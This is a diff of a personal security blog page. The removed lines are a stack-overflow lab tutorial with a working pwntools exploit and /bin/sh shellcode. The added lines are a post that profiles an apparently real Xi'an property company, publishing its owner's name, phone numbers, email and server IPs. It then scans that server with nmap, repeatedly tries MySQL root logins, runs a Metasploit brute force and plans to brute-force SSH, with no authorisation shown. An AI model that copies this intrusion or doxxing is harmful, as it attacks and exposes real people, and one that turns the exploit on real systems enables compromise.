@@ -4,14 +4,8 @@
 
 <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="栈溢出（二）, WindQ">
-    <meta name="description" content="这次与上一篇文章的不同的是，原代码中没有自带的恶意代码，这时候我们就要考虑自己填塞一段恶意代码以达到目的。
-　　源程序代码如下：     
-#include&amp;lt;stdio.h&gt;
-char str[100];
-void vul()
-{
- ">
+    <meta name="keywords" content="WindQ">
+    <meta name="description" content="一、信息收集　　1.可以看见，原网站下面有一个客服电话，这就是一个信息客服电话：17702979181百度这个电话可以查得：这是一个西安的电信号码，相关信息基本都与房地产相关，机主姓名：黄经稳　　2.电话下面有网站所属，即“西安爱家屋”　　">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -19,7 +13,7 @@ void vul()
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>栈溢出（二） | WindQ</title>
+    <title>WindQ</title>
     <link rel="icon" type="image/jpeg" href="/favicon.jpg">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -263,13 +257,13 @@ void vul()
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/11.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        栈溢出（二）
+                        
                     </div>
                 </div>
             </div>
@@ -378,25 +372,12 @@ void vul()
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                    <div class="article-tag">
-                        
-                            <a href="/tags/栈溢出/" target="_blank">
-                                <span class="chip bg-color">栈溢出</span>
-                            </a>
-                        
-                    </div>
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
                     
                 </div>
                 <div class="col s5 right-align">
-                    
-                    <div class="post-cate">
-                        <i class="fa fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/二进制安全/" class="post-category" target="_blank">
-                                二进制安全
-                            </a>
-                        
-                    </div>
                     
                 </div>
             </div>
@@ -404,21 +385,21 @@ void vul()
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-03-27
+                    2019-06-01
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        402
+                        823
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        1 分
+                        3 分
                     </div>
                     
                 
@@ -429,51 +410,19 @@ void vul()
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h5 id="这次与上一篇文章的不同的是，原代码中没有自带的恶意代码，这时候我们就要考虑自己填塞一段恶意代码以达到目的。"><a href="#这次与上一篇文章的不同的是，原代码中没有自带的恶意代码，这时候我们就要考虑自己填塞一段恶意代码以达到目的。" class="headerlink" title="这次与上一篇文章的不同的是，原代码中没有自带的恶意代码，这时候我们就要考虑自己填塞一段恶意代码以达到目的。"></a>这次与上一篇文章的不同的是，原代码中没有自带的恶意代码，这时候我们就要考虑自己填塞一段恶意代码以达到目的。</h5><a id="more"></a>
-<p>　　源程序代码如下：     </p>
-<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
-<span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token keyword">void</span> <span class="token function">vul</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token punctuation">{</span>
-    <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> s<span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-
-<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token punctuation">{</span>
-    <span class="token function">vul</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
+                <h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><p>　　1.可以看见，原网站下面有一个客服电话，这就是一个信息<br>客服电话：<code>17702979181</code><br>百度这个电话可以查得：这是一个西安的电信号码，相关信息基本都与房地产相关，机主姓名：黄经稳<br><img src="https://pic1.ajkimg.com/display/anjuke/81b857065d5648f1576771f40f4b0d30/600x796x0x57/100x133.jpg" alt="机主/网站主人照片"><br>　　2.电话下面有网站所属，即“西安爱家屋”<br>　　3.whois唯一有用的信息是本ip上只有这一个域名。<br>　　4.在百度下搜索西安爱家屋，发现有两个，第一个是橱柜，第二个是房地产。房地产相关的应该才是我们的目标。<br>房地产相关的搜索结果来源是天眼查，注册法人是黄经稳，监事是白晓雷。50w的小公司，2018年4月21日成立。<br>黄经稳，邮箱<a href="mailto:1637478949@qq.com" target="_blank" rel="noopener">1637478949@qq.com</a>，第二个电话<code>13008830882（广东深圳）</code>，登记网址是<code>www.ifamilyhouse.com（打开是nginx的欢迎页面）</code>，ip是<code>118.24.234.251（上海市联通）</code>，<code>47.74.248.20</code>的ip地址是香港，<strong>阿里云服务器</strong>。（心凉一半，阿里云的服务器咋个整）<br>　　5.用nmap扫了一下所有端口（<code>nmap -p 1-65535 47.74.248.20</code>）。<br>22（<code>ssh</code>），80（<code>http</code>），3000（<code>ppp</code>），3306（<code>mysql</code>），11369（<code>不知道干啥用的</code>）端口是开放的。<br>nmap执行命令<code>nmap -O 47.74.248.20</code>，扫描结果中端口方面同上，其他结果如下：           </p>
+<pre class=" language-bash"><code class="language-bash">Device type: general purpose           
+Running: Linux 4.X              
+OS CPE: cpe:/o:linux:linux_kernel:4.4           
+OS details: Linux 4.4
 </code></pre>
-<p>　　自己填塞恶意代码，容易“跑”，我们需要一块稳定的，持续可用的代码段来供我们使用。这时候首先想到的是<code>bss</code>段，因为<code>bss</code>段通常用来存放程序中未初始化的全局变量，且可读可写。变量一般分为全局变量和局部变量，局部变量的存活时间较短，函数执行完就自动释放了，全局变量则不同，可以被程序内所有的对象或函数引用，相对来说更加稳定，比较适合存放一段恶意代码。<br>　　<code>bss</code>段可读可写不可执行，因此如果我们想进行实验，需要关掉栈保护和数据执行保护，使得<code>bss</code>段的代码变得可以执行。编译命令如下：    </p>
-<pre class=" language-bash"><code class="language-bash">gcc -fno-stack-protector -z execstack -o xxxx xxxx.c
+<p>　　6.子域名<br>御剑扫描，只有两个，一个是主页面：/index.php（可知是php）<br>另一个是：/robots.txt（没什么价值）<br>　　7.还想收集信息可能就得靠社工了，如果需求什么关键信息再考虑。            </p>
+<h2 id="二、尝试渗透"><a href="#二、尝试渗透" class="headerlink" title="二、尝试渗透"></a>二、尝试渗透</h2><p>　　1.第一眼就看见mysql远程服务的3306是开着的，尝试用命令行的简单mysql语句登录，如下：            </p>
+<pre class=" language-bash"><code class="language-bash">C:\Users\HP<span class="token operator">></span>mysql -h 47.74.248.20 -P 3306 -u root -p root
+Enter password: ****
+ERROR 1045 <span class="token punctuation">(</span>28000<span class="token punctuation">)</span>: Access denied <span class="token keyword">for</span> user <span class="token string">'root'</span>@<span class="token string">'117.32.216.11'</span> <span class="token punctuation">(</span>using password: YES<span class="token punctuation">)</span>
 </code></pre>
-<p>　　<code>-fno-stack-protector</code>用于关掉栈保护，<code>-z execstack</code>用于关掉数据可执行保护（DEP）。攻击脚本代码如下：</p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-
-io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./vul"</span><span class="token punctuation">)</span>
-elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./vul"</span><span class="token punctuation">)</span>
-<span class="token comment" spellcheck="true">#io = remote('127.0.0.1', 10001)       #远程</span>
-read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span>
-
-
-payload  <span class="token operator">=</span> <span class="token string">"a"</span> <span class="token operator">*</span> <span class="token number">44</span>
-payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span>
-payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x0804a040</span><span class="token punctuation">)</span>
-payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
-payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x0804a040</span><span class="token punctuation">)</span>
-payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>
-
-sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-
-
-shellcode <span class="token operator">=</span> <span class="token string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span>
-
-sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
-
-io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
-</code></pre>
+<p>　　说明的确连接上了，只是密码不对劲。如此尝试了很多次，每次都是密码不对，但并未禁止登录或者封ip，于是想到用msf里的mysql_login模块去破解它。<br>但每次破解都是只尝试了三次就终止了，提示如下：<code>Unable to Connect: unknown charset number: 224</code><br>查了一下，应该是目标的mysql用了utf-8mb4字符集，导致无法连接。更改目标的设置是不太现实的，访问不到.ini文件，于是想是否能修改工具脚本里的字符集设置？还在研究学习中，暂时无成果。<br>（如果不成功，第二个想法是尝试自己猜解口令，看他两个网站的专业程度，应该是本人管理，也可以尝试从另一个网站入手。还没尝试另一个是不是也用了utf-8mb4的字符集，如果可以破解的话，说不定两个口令是同一个，其他的设置也是相同或者类似的）<br>　　<code>47.74.248.20</code>的mysql3306爆破基本失败。<br>　　2.第二眼看见的是提供<code>ssh</code>服务的22端口，尝试一下爆破它。<br>3.ppp是啥服务？<br>4.能否查出中间件的版本？如果能的话看看对应的有什么版本漏洞没有。</p>
 
             </div>
             <hr>
@@ -497,7 +446,7 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                     </span>
                     <a href="http://windq08.github.io" class="b-link-green">WindQ</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/2019/03/27/zhan-yi-chu-er/" class="b-link-green">栈溢出（二）</a>
+                    <a href="/2019/06/01/ao-ao-suo-duo/" class="b-link-green"></a>
                 </p>
             </div>
         </div>
@@ -520,44 +469,33 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
         
         <div class="article col s12 m6 overflow-policy" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2019/04/13/zhan-yi-chu-san/">
+                <a href="/2019/06/01/ao-ao-suo-duo/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="栈溢出（三）">
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt>
                         
-                        <span class="card-title">栈溢出（三）</span>
+                        <span class="card-title"></span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">        
-一、了解一下libc　　libc动态链接库中的函数被广泛使用，所以有大概率可以在内存中找到libc动态库。该库内包含了一些系统级的函数，比如system()，所以可以尝试用这些系统级的函数取得控制权。再比如，这样的参数有可</div>
+                    <div class="summary">一、信息收集　　1.可以看见，原网站下面有一个客服电话，这就是一个信息客服电话：17702979181百度这个电话可以查得：这是一个西安的电信号码，相关信息基本都与房地产相关，机主姓名：黄经稳　　2.电话下面有网站所属，即“西安爱家屋”　　</div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-04-13
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-06-01
+                            </span>
                         <span class="publish-author">
                             
-                            <i class="fa fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/二进制安全/" class="post-category" target="_blank">
-                                    二进制安全
-                                </a>
-                            
+                            <i class="fa fa-user fa-fw"></i>
+                            WindQ
                             
                         </span>
                     </div>
                 </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/栈溢出/" target="_blank">
-                        <span class="chip bg-color">栈溢出</span>
-                    </a>
-                    
-                </div>
+
                 
             </div>
         </div>
@@ -568,28 +506,28 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/03/25/zhan-yi-chu-yi/">
+                <a href="/2019/04/23/du-bai-mao-zi-jiang-web-an-quan/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="栈溢出（一）">
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="读《白帽子讲Web安全》笔记兼部分基本漏洞学习说明">
                         
-                        <span class="card-title">栈溢出（一）</span>
+                        <span class="card-title">读《白帽子讲Web安全》笔记兼部分基本漏洞学习说明</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">开学第一周接触的，最简单的栈溢出学习，基本属于原理级别，后面涉及一点延迟绑定知识。        
-一、栈溢出的概念　　首先我们要知道在计算机内部，一块内存的地址是连续的，是上下连贯的。其次，程序在运行过程中，为了临时存取数据的需要，一般都</div>
+                    <div class="summary">道哥吴翰清的《白帽子讲Web安全》，刚选完专业就买了，当时没怎么看懂，陆陆续续的看了这么久也没看完，现在重抠一遍这本书，留个记录。挺基础的入门书，但是写的蛮好的，用这个来巩固学习基础知识。
+第一章安全的本质是信任的问题。决策依据一旦被打破，</div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-03-25
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-04-23
                             </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/二进制安全/" class="post-category" target="_blank">
-                                    二进制安全
+                            <a href="/categories/Web安全/" class="post-category" target="_blank">
+                                    Web安全
                                 </a>
                             
                             
@@ -599,8 +537,16 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/栈溢出/" target="_blank">
-                        <span class="chip bg-color">栈溢出</span>
+                    <a href="/tags/个人感悟/" target="_blank">
+                        <span class="chip bg-color">个人感悟</span>
+                    </a>
+                    
+                    <a href="/tags/学习笔记/" target="_blank">
+                        <span class="chip bg-color">学习笔记</span>
+                    </a>
+                    
+                    <a href="/tags/成长/" target="_blank">
+                        <span class="chip bg-color">成长</span>
                     </a>
                     
                 </div>
